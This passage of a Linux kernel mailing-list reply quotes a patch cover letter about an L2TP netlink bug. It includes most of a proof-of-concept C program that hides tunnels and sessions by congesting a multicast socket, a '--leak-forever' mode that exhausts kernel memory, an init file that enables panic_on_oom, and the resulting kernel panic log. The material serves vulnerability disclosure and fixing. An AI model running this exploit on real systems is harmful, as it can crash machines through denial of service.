> 			info->lns_mode =3D nla_get_u8(nla);
> 			break;
> 		case L2TP_ATTR_IFNAME:
> 			snprintf(info->ifname, sizeof(info->ifname), "%s",
> 				 (const char *)NLA_DATA(nla));
> 			break;
> 		default:
> 			break;
> 		}
> 	}
>=20
> 	if (info->session_id !=3D session_id || info->tunnel_id !=3D tunnel_id)
> 		return -ENOENT;
> 	return 0;
> }
>=20
> static int l2tp_session_modify(struct nl_socket *sock, uint16_t family_id,
> 			       uint32_t tunnel_id, uint32_t session_id)
> {
> 	char req[MAX_BUF] =3D {0};
> 	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
> 	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
> 	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
> 	uint32_t seq =3D sock->seq++;
> 	int ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	nlh->nlmsg_type =3D family_id;
> 	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
> 	nlh->nlmsg_seq =3D seq;
>=20
> 	genlh->cmd =3D L2TP_CMD_SESSION_MODIFY;
> 	genlh->version =3D L2TP_GENL_VERSION;
>=20
> 	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel=
_id);
> 	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_SESSION_=
ID,
> 				 session_id);
> 	ret =3D ret ?: nla_put_u8(req, sizeof(req), &offset, L2TP_ATTR_RECV_SEQ,=
 1);
> 	ret =3D ret ?: nla_put_u8(req, sizeof(req), &offset, L2TP_ATTR_SEND_SEQ,=
 1);
> 	ret =3D ret ?: nla_put_u8(req, sizeof(req), &offset, L2TP_ATTR_LNS_MODE,=
 1);
> 	if (ret < 0)
> 		return ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	ret =3D nl_send(sock, req, nlh->nlmsg_len);
> 	if (ret < 0)
> 		return ret;
> 	return nl_wait_ack(sock, seq);
> }
>=20
> static int l2tp_session_delete(struct nl_socket *sock, uint16_t family_id,
> 			       uint32_t tunnel_id, uint32_t session_id)
> {
> 	char req[MAX_BUF] =3D {0};
> 	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
> 	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
> 	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
> 	uint32_t seq =3D sock->seq++;
> 	int ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	nlh->nlmsg_type =3D family_id;
> 	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
> 	nlh->nlmsg_seq =3D seq;
>=20
> 	genlh->cmd =3D L2TP_CMD_SESSION_DELETE;
> 	genlh->version =3D L2TP_GENL_VERSION;
>=20
> 	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel=
_id);
> 	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_SESSION_=
ID,
> 				 session_id);
> 	if (ret < 0)
> 		return ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	ret =3D nl_send(sock, req, nlh->nlmsg_len);
> 	if (ret < 0)
> 		return ret;
> 	return nl_wait_ack(sock, seq);
> }
>=20
> static int l2tp_tunnel_delete(struct nl_socket *sock, uint16_t family_id,
> 			      uint32_t tunnel_id)
> {
> 	char req[MAX_BUF] =3D {0};
> 	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
> 	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
> 	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
> 	uint32_t seq =3D sock->seq++;
> 	int ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	nlh->nlmsg_type =3D family_id;
> 	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
> 	nlh->nlmsg_seq =3D seq;
>=20
> 	genlh->cmd =3D L2TP_CMD_TUNNEL_DELETE;
> 	genlh->version =3D L2TP_GENL_VERSION;
>=20
> 	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel=
_id);
> 	if (ret < 0)
> 		return ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	ret =3D nl_send(sock, req, nlh->nlmsg_len);
> 	if (ret < 0)
> 		return ret;
> 	return nl_wait_ack(sock, seq);
> }
>=20
> static void format_ifname(char *buf, size_t buflen, uint32_t session_id)
> {
> 	snprintf(buf, buflen, "pw%u", session_id);
> }
>=20
> static int observe_target_bug(bool leak_forever)
> {
> 	struct nl_socket manager =3D { .fd =3D -1 };
> 	struct nl_socket blocker =3D { .fd =3D -1 };
> 	struct l2tp_family family;
> 	struct tunnel_info tunnel;
> 	struct session_info session;
> 	uint32_t created_tunnels[2048];
> 	uint32_t created_sessions[2048];
> 	size_t tunnel_count =3D 0;
> 	size_t session_count =3D 0;
> 	uint32_t base_tunnel =3D 1000 + ((uint32_t)getpid() % 100000) * 32;
> 	uint32_t base_peer_tunnel =3D 500000 + ((uint32_t)getpid() % 100000) * 3=
2;
> 	uint32_t base_session =3D 1000000 + ((uint32_t)getpid() % 100000) * 32;
> 	uint16_t base_sport =3D 10000 + ((uint32_t)getpid() % 20000);
> 	uint16_t base_dport =3D 40000 + ((uint32_t)getpid() % 20000);
> 	uint32_t hidden_tunnel =3D 0;
> 	uint32_t hidden_session =3D 0;
> 	char ifname[IFNAMSIZ];
> 	int modify_ret;
> 	int ret;
>=20
> 	ret =3D nl_open(&manager);
> 	if (ret < 0)
> 		die_ret("nl_open(manager)", ret);
> 	ret =3D nl_open(&blocker);
> 	if (ret < 0)
> 		die_ret("nl_open(blocker)", ret);
>=20
> 	ret =3D resolve_l2tp_family(&manager, &family);
> 	if (ret < 0)
> 		die_ret("resolve_l2tp_family", ret);
>=20
> 	ret =3D blocker_setup(&blocker, family.mcgrp_id);
> 	if (ret < 0)
> 		die_ret("blocker_setup", ret);
>=20
> 	printf("[+] L2TP family_id=3D%u mcgrp_id=3D%u blocker_portid=3D%u\n",
> 	       family.family_id, family.mcgrp_id, blocker.portid);
> 	printf("[+] Using tunnel base=3D%u session base=3D%u udp base=3D%u/%u\n",
> 	       base_tunnel, base_session, base_sport, base_dport);
> 	printf("[+] Warming the subscribed blocker socket until multicast starts=
 failing\n");
>=20
> 	for (uint32_t i =3D 0; i < ARRAY_SIZE(created_tunnels); i++) {
> 		uint32_t tunnel_id =3D base_tunnel + i;
> 		uint16_t sport =3D base_sport + i;
> 		uint16_t dport =3D base_dport + i;
>=20
> 		ret =3D l2tp_tunnel_create(&manager, family.family_id, tunnel_id,
> 					 base_peer_tunnel + i, sport, dport);
> 		if (ret =3D=3D -ENOBUFS) {
> 			hidden_tunnel =3D tunnel_id;
> 			printf("[+] tunnel_create returned ENOBUFS at tunnel_id=3D%u\n",
> 			       hidden_tunnel);
> 			break;
> 		}
> 		if (ret < 0)
> 			die_ret("l2tp_tunnel_create", ret);
> 		created_tunnels[tunnel_count++] =3D tunnel_id;
> 		if ((i + 1) % 32 =3D=3D 0)
> 			printf("    created %u visible tunnels so far\n", i + 1);
> 	}
>=20
> 	if (!hidden_tunnel) {
> 		fprintf(stderr, "[-] failed to congest the blocker socket within %zu tu=
nnel creates\n",
> 			ARRAY_SIZE(created_tunnels));
> 		return 1;
> 	}
>=20
> 	ret =3D l2tp_tunnel_get(&manager, family.family_id, hidden_tunnel, &tunn=
el);
> 	if (ret < 0)
> 		die_ret("l2tp_tunnel_get(hidden_tunnel)", ret);
> 	printf("[+] hidden tunnel is live: tunnel_id=3D%u peer=3D%u udp=3D%u/%u\=
n",
> 	       tunnel.tunnel_id, tunnel.peer_tunnel_id,
> 	       tunnel.udp_sport, tunnel.udp_dport);
>=20
> 	printf("[+] Creating an Ethernet session on the hidden tunnel\n");
> 	for (uint32_t i =3D 0; i < ARRAY_SIZE(created_sessions); i++) {
> 		uint32_t session_id =3D base_session + i;
>=20
> 		format_ifname(ifname, sizeof(ifname), session_id);
> 		ret =3D l2tp_session_create(&manager, family.family_id, hidden_tunnel,
> 					  session_id, base_session + 100000 + i,
> 					  ifname);
> 		if (ret =3D=3D -ENOBUFS) {
> 			hidden_session =3D session_id;
> 			printf("[+] session_create returned ENOBUFS at session_id=3D%u ifname=
=3D%s\n",
> 			       hidden_session, ifname);
> 			break;
> 		}
> 		if (ret < 0)
> 			die_ret("l2tp_session_create", ret);
> 		created_sessions[session_count++] =3D session_id;
> 	}
>=20
> 	if (!hidden_session) {
> 		fprintf(stderr, "[-] failed to trigger session_create notification fail=
ure\n");
> 		return 1;
> 	}
>=20
> 	ret =3D l2tp_session_get(&manager, family.family_id, hidden_tunnel,
> 			       hidden_session, &session);
> 	if (ret < 0)
> 		die_ret("l2tp_session_get(hidden_session)", ret);
> 	printf("[+] hidden session is live: tunnel=3D%u session=3D%u ifname=3D%s=
 recv_seq=3D%u send_seq=3D%u lns_mode=3D%u\n",
> 	       session.tunnel_id, session.session_id, session.ifname,
> 	       session.recv_seq, session.send_seq, session.lns_mode);
>=20
> 	printf("[+] Modifying the hidden session\n");
> 	modify_ret =3D l2tp_session_modify(&manager, family.family_id, hidden_tu=
nnel,
> 					 hidden_session);
> 	if (modify_ret < 0 && modify_ret !=3D -ENOBUFS)
> 		die_ret("l2tp_session_modify", modify_ret);
> 	if (modify_ret =3D=3D -ENOBUFS)
> 		printf("[+] session_modify returned ENOBUFS as expected\n");
> 	else
> 		printf("[!] session_modify unexpectedly returned success; continuing to=
 verify live state anyway\n");
>=20
> 	ret =3D l2tp_session_get(&manager, family.family_id, hidden_tunnel,
> 			       hidden_session, &session);
> 	if (ret < 0)
> 		die_ret("l2tp_session_get(post-modify)", ret);
> 	printf("[+] post-modify session state: recv_seq=3D%u send_seq=3D%u lns_m=
ode=3D%u\n",
> 	       session.recv_seq, session.send_seq, session.lns_mode);
>=20
> 	if (session.recv_seq !=3D 1 || session.send_seq !=3D 1 || session.lns_mo=
de !=3D 1) {
> 		fprintf(stderr, "[-] session_modify did not commit the expected live st=
ate\n");
> 		return 1;
> 	}
>=20
> 	if (leak_forever) {
> 		uint32_t session_id =3D hidden_session + 1;
> 		uint64_t leaked =3D 1;
>=20
> 		printf("[+] Entering leak loop on hidden tunnel %u; kill the process or=
 wait for OOM/panic\n",
> 		       hidden_tunnel);
> 		fflush(stdout);
>=20
> 		for (;; session_id++) {
> 			format_ifname(ifname, sizeof(ifname), session_id);
> 			ret =3D l2tp_session_create(&manager, family.family_id, hidden_tunnel,
> 						  session_id, session_id + 40000,
> 						  ifname);
> 			if (ret !=3D 0 && ret !=3D -ENOBUFS)
> 				die_ret("leak l2tp_session_create", ret);
>=20
> 			leaked++;
> 			if ((leaked % 256) =3D=3D 0) {
> 				printf("[+] leaked %" PRIu64 " hidden Ethernet sessions so far\n",
> 				       leaked);
> 				fflush(stdout);
> 			}
> 		}
> 	}
>=20
> 	if (!leak_forever) {
> 		printf("[+] Closing blocker and cleaning up leaked objects\n");
> 		nl_close(&blocker);
> 		(void)l2tp_session_delete(&manager, family.family_id, hidden_tunnel,
> 					  hidden_session);
> 		for (size_t i =3D 0; i < session_count; i++)
> 			(void)l2tp_session_delete(&manager, family.family_id,
> 						  hidden_tunnel, created_sessions[i]);
> 		(void)l2tp_tunnel_delete(&manager, family.family_id, hidden_tunnel);
> 		for (size_t i =3D 0; i < tunnel_count; i++)
> 			(void)l2tp_tunnel_delete(&manager, family.family_id,
> 						  created_tunnels[i]);
> 	}
>=20
> 	printf("[+] Observed the target paths:\n");
> 	printf("    tunnel_create returned ENOBUFS after publishing tunnel %u\n",
> 	       hidden_tunnel);
> 	printf("    session_create returned ENOBUFS after publishing session %u\=
n",
> 	       hidden_session);
> 	printf("    session_modify returned %s after committing recv_seq/send_se=
q/lns_mode=3D1\n",
> 	       modify_ret =3D=3D -ENOBUFS ? "ENOBUFS" : "success");
>=20
> 	nl_close(&manager);
> 	nl_close(&blocker);
> 	return 0;
> }
>=20
> int main(int argc, char **argv)
> {
> 	bool leak_forever =3D false;
>=20
> 	if (argc > 2) {
> 		fprintf(stderr, "usage: %s [--leak-forever]\n", argv[0]);
> 		return EXIT_FAILURE;
> 	}
> 	if (argc =3D=3D 2) {
> 		if (strcmp(argv[1], "--leak-forever") !=3D 0) {
> 			fprintf(stderr, "unknown option: %s\n", argv[1]);
> 			return EXIT_FAILURE;
> 		}
> 		leak_forever =3D true;
> 	}
>=20
> 	return observe_target_bug(leak_forever);
> }
> ------END poc.c--------
>=20
> The finite run exits after observing the committed states. The crash log =
uses
> the `--leak-forever` branch shown at the end of `poc.c`.
>=20
> ------BEGIN init-original.c------
> #define _GNU_SOURCE
> #include <errno.h>
> #include <linux/reboot.h>
> #include <fcntl.h>
> #include <net/if.h>
> #include <stdio.h>
> #include <string.h>
> #include <sys/ioctl.h>
> #include <sys/mount.h>
> #include <sys/reboot.h>
> #include <sys/socket.h>
> #include <unistd.h>
>=20
> static void bring_lo_up(void)
> {
>     struct ifreq ifr;
>     int fd =3D socket(AF_INET, SOCK_DGRAM, 0);
>     if (fd < 0)
>         return;
>     memset(&ifr, 0, sizeof(ifr));
>     snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");
>     if (ioctl(fd, SIOCGIFFLAGS, &ifr) =3D=3D 0) {
>         ifr.ifr_flags |=3D IFF_UP | IFF_RUNNING;
>         (void)ioctl(fd, SIOCSIFFLAGS, &ifr);
>     }
>     close(fd);
> }
>=20
> int main(void)
> {
>     char *const args[] =3D { (char *)"/poc-original", (char *)"--leak-for=
ever", NULL };
>     char *const envp[] =3D { (char *)"PATH=3D/", NULL };
>     int fd;
>     const char value[] =3D "2\n";
>=20
>     mount("proc", "/proc", "proc", 0, NULL);
>     mount("sysfs", "/sys", "sysfs", 0, NULL);
>     fd =3D open("/proc/sys/vm/panic_on_oom", O_WRONLY);
>     if (fd >=3D 0) {
>         (void)write(fd, value, sizeof(value) - 1);
>         close(fd);
>     }
>     bring_lo_up();
>     fprintf(stdout, "[init] launching original PoC leak run\n");
>     fflush(stdout);
>     execve(args[0], args, envp);
>     fprintf(stderr, "[init] execve failed: %d (%s)\n", errno, strerror(er=
rno));
>     return 127;
> }
> ------END init-original.c--------
>=20
> The crash log below is from the `/poc-original --leak-forever` run
> launched by the initramfs `/init` shown above. That init wrote `2\n` to
> `/proc/sys/vm/panic_on_oom` before execve, and the OOM path panicked as s=
hown
> below.
>=20
> It is decoded output from the vulnerable 7.2.0-rc7+ #1 run, using the vml=
inux
> built from the same unpatched source tree and image.
>=20
> ----BEGIN crash log----
> [   43.407115] Kernel panic - not syncing: Out of memory: compulsory pani=
c_on_oom is enabled
> [   43.407786] CPU: 1 UID: 0 PID: 1 Comm: poc-original Not tainted 7.2.0-=
rc7+ #1 PREEMPT(lazy)
> [   43.407786] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arc=
h_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> [   43.407786] Call Trace:
> [   43.407786]  <TASK>
> [   43.407786]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
> [   43.407786]  dump_stack (lib/dump_stack.c:129)
> [   43.407786]  vpanic (kernel/panic.c:651)
> [   43.407786]  panic (kernel/panic.c:788)
> [   43.407786]  out_of_memory (mm/oom_kill.c:1076 (discriminator 4) mm/oo=
m_kill.c:1143 (discriminator 4))
> [   43.407786]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4116 mm/page=
_alloc.c:4967 mm/page_alloc.c:5317)
> [   43.407786]  allocate_slab (mm/slub.c:3266 (discriminator 2) mm/slub.c=
:3388 (discriminator 2))
> [   43.407786]  new_slab (mm/slub.c:3426)
> [   43.407786]  refill_objects (mm/slub.c:7310)
> [   43.407786]  __pcs_replace_empty_main (mm/slub.c:2804 mm/slub.c:4675)
> [   43.407786]  kmem_cache_alloc_noprof (mm/slub.c:4773 mm/slub.c:4905 mm=
/slub.c:4931)
> [   43.407786]  ? __kernfs_new_node (fs/kernfs/dir.c:665 (discriminator 2=
))
> [   43.407786]  __kernfs_new_node (fs/kernfs/dir.c:665 (discriminator 2))
> [   43.407786]  ? idr_alloc_cyclic (lib/idr.c:127)
> [   43.407786]  kernfs_new_node (fs/kernfs/dir.c:751 (discriminator 1))
> [   43.407786]  __kernfs_create_file (fs/kernfs/file.c:1050)
> [   43.407786]  sysfs_add_file_mode_ns (fs/sysfs/file.c:316)
> [   43.407786]  ? device_get_ownership (drivers/base/core.c:2658)
> [   43.407786]  internal_create_group (fs/sysfs/group.c:82 fs/sysfs/group=
=2Ec:189)
> [   43.407786]  ? kernfs_add_one (fs/kernfs/dir.c:868)
> [   43.407786]  internal_create_groups (fs/sysfs/group.c:229)
> [   43.407786]  sysfs_create_groups (fs/sysfs/group.c:255)
> [   43.407786]  device_add (drivers/base/core.c:2907 drivers/base/core.c:=
2971 drivers/base/core.c:3711)
> [   43.407786]  ? dev_set_name (drivers/base/core.c:3560)
> [   43.407786]  netdev_register_kobject (net/core/net-sysfs.c:2340)
> [   43.407786]  ? raw_notifier_call_chain (kernel/notifier.c:453)
> [   43.407786]  register_netdevice (net/core/dev.c:11450)
> [   43.407786]  l2tp_eth_create (net/l2tp/l2tp_eth.c:289)
> [   43.407786]  l2tp_nl_cmd_session_create (net/l2tp/l2tp_netlink.c:639 (=
discriminator 1))
> [   43.407786]  genl_family_rcv_msg_doit (net/netlink/genetlink.c:1114)
> [   43.407786]  genl_rcv_msg (net/netlink/genetlink.c:1194 net/netlink/ge=
netlink.c:1209)
> [   43.407786]  ? __pfx_l2tp_nl_cmd_session_create (net/l2tp/l2tp_netlink=
=2Ec:141)
> [   43.407786]  ? __pfx_genl_rcv_msg (net/netlink/genetlink.c:1079)
> [   43.407786]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
> [   43.407786]  genl_rcv (net/netlink/genetlink.c:1218)
> [   43.407786]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlin=
k/af_netlink.c:1345)
> [   43.407786]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
> [   43.407786]  ____sys_sendmsg (net/socket.c:775 (discriminator 1) net/s=
ocket.c:790 (discriminator 1) net/socket.c:2684 (discriminator 1))
> [   43.407786]  ___sys_sendmsg (net/socket.c:2738)
> [   43.407786]  __sys_sendmsg (net/socket.c:2770)
> [   43.407786]  __x64_sys_sendmsg (net/socket.c:2775 net/socket.c:2773 ne=
t/socket.c:2773)
> [   43.407786]  x64_sys_call (arch/x86/include/generated/asm/syscalls_64.=
h:47)
> [   43.407786]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/en=
try/syscall_64.c:94)
> [   43.407786]  ? __x64_sys_recvfrom (net/socket.c:2317 net/socket.c:2313=
 net/socket.c:2313)
> [   43.407786]  ? x64_sys_call (arch/x86/include/generated/asm/syscalls_6=
4.h:46)
> [   43.407786]  ? do_syscall_64 (arch/x86/include/asm/entry-common.h:63 i=
nclude/linux/irq-entry-common.h:210 include/linux/irq-entry-common.h:230 in=
clude/linux/entry-common.h:318 arch/x86/entry/syscall_64.c:100)
> [   43.407786]  ? __x64_sys_sendmsg (net/socket.c:2775 net/socket.c:2773 =
net/socket.c:2773)
> [   43.407786]  ? x64_sys_call (arch/x86/include/generated/asm/syscalls_6=
4.h:47)
> [   43.407786]  ? do_syscall_64 (arch/x86/include/asm/entry-common.h:63 i=
nclude/linux/irq-entry-common.h:210 include/linux/irq-entry-common.h:230 in=
clude/linux/entry-common.h:318 arch/x86/entry/syscall_64.c:100)
> [   43.407786]  ? do_syscall_64 (include/linux/randomize_kstack.h:57 arch=
/x86/entry/syscall_64.c:92)
> [   43.407786]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S=
:121)
> [   43.407786] RIP: 0033:0x41ff64
> [   43.407786] Code: c2 c0 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff e=
b b5 0f 1f 00 f3 0f 1e fa 80 3d fd e0 08 00 00 74 13 b8 2e 00 00 00 0f 05 <=
48> 3d 00 f0 ff ff 77 4c c3 0f 1f 00 55 48 89 e5 48 83 ec 20 89 55
> All code
> =3D=3D=3D=3D=3D=3D=3D=3D
>    0:	c2 c0 ff             	ret    $0xffc0
>    3:	ff                   	(bad)
>    4:	ff f7                	push   %rdi
>    6:	d8 64 89 02          	fsubs  0x2(%rcx,%rcx,4)
>    a:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
>   11:	eb b5                	jmp    0xffffffffffffffc8
>   13:	0f 1f 00             	nopl   (%rax)
>   16:	f3 0f 1e fa          	endbr64
>   1a:	80 3d fd e0 08 00 00 	cmpb   $0x0,0x8e0fd(%rip)        # 0x8e11e
>   21:	74 13                	je     0x36
>   23:	b8 2e 00 00 00       	mov    $0x2e,%eax
>   28:	0f 05                	syscall
>   2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trappin=
g instruction
>   30:	77 4c                	ja     0x7e
>   32:	c3                   	ret
>   33:	0f 1f 00             	nopl   (%rax)
>   36:	55                   	push   %rbp
>   37:	48 89 e5             	mov    %rsp,%rbp
>   3a:	48 83 ec 20          	sub    $0x20,%rsp
>   3e:	89                   	.byte 0x89
>   3f:	55                   	push   %rbp
>=20
> Code starting with the faulting instruction
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>    0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
>    6:	77 4c                	ja     0x54
>    8:	c3                   	ret
>    9:	0f 1f 00             	nopl   (%rax)
>    c:	55                   	push   %rbp
>    d:	48 89 e5             	mov    %rsp,%rbp
>   10:	48 83 ec 20          	sub    $0x20,%rsp
>   14:	89                   	.byte 0x89
>   15:	55                   	push   %rbp
> [   43.407786] RSP: 002b:00007ffdeb4d6a98 EFLAGS: 00000202 ORIG_RAX: 0000=
00000000002e
> [   43.407786] RAX: ffffffffffffffda RBX: 00007ffdeb4dabf8 RCX: 000000000=
041ff64
> [   43.407786] RDX: 0000000000000000 RSI: 00007ffdeb4d6ac0 RDI: 000000000=
0000003
> [   43.407786] RBP: 00007ffdeb4d6b30 R08: 00007ffdeb4dec40 R09: 000000000=
000000a
> [   43.407786] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffde=
b4dec40
> [   43.407786] R13: 000000000000a4c3 R14: 00007ffdeb4d6b28 R15: 00007ffde=
b4d6b20
> [   43.407786]  </TASK>
> [   43.407786] Kernel Offset: 0x35e00000 from 0xffffffff81000000 (relocat=
ion range: 0xffffffff80000000-0xffffffffbfffffff)
> [   43.407786] ---[ end Kernel panic - not syncing: Out of memory: compul=
sory panic_on_oom is enabled ]---
> -----END crash log-----
>=20
> Best regards,
> Zihan Xi
>=20
> Zihan Xi (1):
>   net: l2tp: ignore multicast notification errors in netlink commands
>=20
>  net/l2tp/l2tp_netlink.c | 12 ++++++------
>  1 file changed, 6 insertions(+), 6 deletions(-)
>=20
> --=20
> 2.43.0
>=20
>=20

--=20
Tom Parkin
Katalix Systems Ltd
https://katalix.com
Catalysts for your Embedded Linux software development

--UO1CyJLmmzewn7DP
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQEzBAABCgAdFiEEsUkgyDzMwrj81nq0lIwGZQq6i9AFAmqNUC4ACgkQlIwGZQq6
i9BGnggAxwfShylHu44QQnYk4vHoMWboZ8KjMGQNYlqnAr/ESXIvjfkWLFvTKR6S
L8V5j67aSz3o+9zNG9nsqCF1cZkAFgGtTLk68ASFFsYgMIdthL844DkdARI/mGnM
CGb2l+hZ0ziptP37rmjrRNa617zWCWR2k7bw+6Z6uQ/Wz+SbDaxRoh3malDHKJmT
iFamYn+dOb1vc4HxBVLemfSH1SIAVhuDDa0pKitgKJe0nm1/RJbIM94I8Cg/WVsl
ysurw28OsqPvGBv2xBwcko5ULRSEdzzQ9ZLgged1Fza5NSC5TwebQo624OFxQO4/
iFc/W3jLGds9PDnc9ywStxu4xwKhjQ==
=Ukkh
-----END PGP SIGNATURE-----

--UO1CyJLmmzewn7DP--
